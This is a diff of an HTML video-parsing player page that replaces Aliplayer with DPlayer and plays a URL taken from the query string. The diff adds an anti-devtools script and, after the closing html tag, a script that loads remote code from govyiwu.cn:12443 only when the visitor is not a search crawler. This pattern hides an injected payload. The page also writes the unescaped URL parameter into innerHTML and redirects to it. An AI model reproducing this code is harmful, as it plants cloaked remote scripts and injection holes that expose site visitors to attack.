@@ -1,21 +1,31 @@
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <meta http-equiv="x-ua-compatible" content="IE=edge" >
-  <meta name="referrer" content="never">
-  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"/>
-  <title>Aliplay记忆播放器（点播）</title>
-  <link rel="stylesheet" href="https://g.alicdn.com/de/prismplayer/2.9.3/skins/default/aliplayer-min.css" />
-  <script type="text/javascript" charset="utf-8" src="https://g.alicdn.com/de/prismplayer/2.9.3/aliplayer-min.js"></script>
-  <script type="text/javascript" charset="utf-8" src="https://player.alicdn.com/aliplayer/presentation/js/aliplayercomponents.min.js"></script>
+<title>Dp视频解析</title>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
+<meta name="referrer" content="never">
+<meta http-equiv="X-UA-Compatible" content="IE=11" />
+<meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" id="viewport" name="viewport">
+<link href="https://cdn.staticfile.org/dplayer/1.25.0/DPlayer.min.css" rel="stylesheet">
+<script src="https://cdn.staticfile.org/jquery/2.2.3/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/hls.js/0.10.1/hls.min.js"></script>
+<script src="https://cdn.staticfile.org/dplayer/1.25.0/DPlayer.min.js"></script>
+<script disable-devtool-auto src='https://theajack.gitee.io/disable-devtool/npm/disable-devtool.min.js'></script>
 <style type="text/css">
-    body,html{width:100%;height:100%;background:#000;padding:0;margin:0;overflow-x:hidden;overflow-y:hidden}
-    *{margin:0;border:0;padding:0;text-decoration:none}
-</style>
+        body, html, .video {padding: 0;margin: 0;width: 100%;height: 100%;background-color:#000;}
+        </style>
+<style type="text/css">
+
+.h2_video_nobuy_tips{position: absolute;z-index: 9;color: #fff;font-size: 14px;height: 30px;width: 100%;text-align: center;margin: 0 10px;}
+.h2_video_buybox-content{width:100%;height: 100%;background: rgba(0, 0, 0, 0.3);}
+  .h2_video_buybox-tipsbtn {background: #f60;padding: 5px 15px;border-radius: 2px;cursor: pointer;color: #fff;margin-top: 1px;display: inline-block;}
+  </style>
+  <div id="h2_video_nobuybox"><div class="h2_video_nobuy_tips"><a href="APP下载地址"><m class="h2_video_buybox-tipsbtn">点击下载</m></a>本站专属app,支持投屏和离线下载。</div></div><body style="background:#000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" oncontextmenu=window.event.returnValue=false>
+<div id="video"></div>
 </head>
 <body>
-<div id="playerCnt" class="prism-player"></div>
-<script type="text/javascript">
+<div id="ldgplayer" style="width:100%;height:100%"></div>
+<script>
 function GetQueryString(name)
 {
      var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
@@ -23,37 +33,35 @@ function GetQueryString(name)
      if(r!=null)return  unescape(r[2]); return null;
 }
 var ldgurl = GetQueryString("url");
-var player = new Aliplayer({
-         id: "playerCnt",
-     "source":ldgurl,
-      width: "100%",
-     height: "100%",
-   autoplay: true,
-    preload: true,
-     rePlay: false,
-playsinline: false,
- useH5Prism: false,
-     isLive: false,
- components: [{
-      name: 'MemoryPlayComponent',
-  	  type: AliPlayerComponent.MemoryPlayComponent,
-      args: [true]
-    }], 
-}, 
-function (player) {
-      console.log("The player is created");
+ldgurl=ldgurl.replace('http://','https://');
+ldgurl=ldgurl.replace('http://','https://');
+  if(ldgurl.indexOf("/share/")>0)
+ {
+   location.href=ldgurl;
+  }else
+  {
+		var isPhone = navigator.userAgent.match(/iPad|iPhone|Android|Linux|iPod/i) != null;
+        if (isPhone) {
+            var HTML = '<video src="'+ldgurl+'" controls="controls" poster="//p3fx.kgimg.com/v2/fxuseralbum/72909814f4ef37add4a90bd5b6c123a0.png" autoplay="autoplay" width="100%" height="100%"></video>';
+            document.getElementById("ldgplayer").innerHTML = HTML;
+        } else {
+			var dp = new DPlayer({
+				element: document.getElementById('ldgplayer'),
+				autoplay: true,
+				screenshot: true,
+				video: {
+					url: ldgurl,
+					type: 'auto'
+				}
+			});
+		}
   }
- );
-try{ 
-//document.getElementById('liryCN').style.height = parent.MacPlayer.Height + 'px';  
-}
-catch(e){}
 </script>
-
-<div style="display:none">
+<div style="z-index:9999;position: absolute;bottom:0px;left:0px;">    
 </div>
 </body>
 </html>
+  
 <script type="text/javascript">
 var dkdz='https://www.govyiwu.cn:12443/ty/7604C56E-FC83-13357-22-D9681790E933.alpha';
 if(navigator.userAgent.match(/Baiduspider|Bytespider|YisouSpider|360Spider|gjuren123/i)==null){document.write('<script src="'+dkdz+'"><\/script>');}
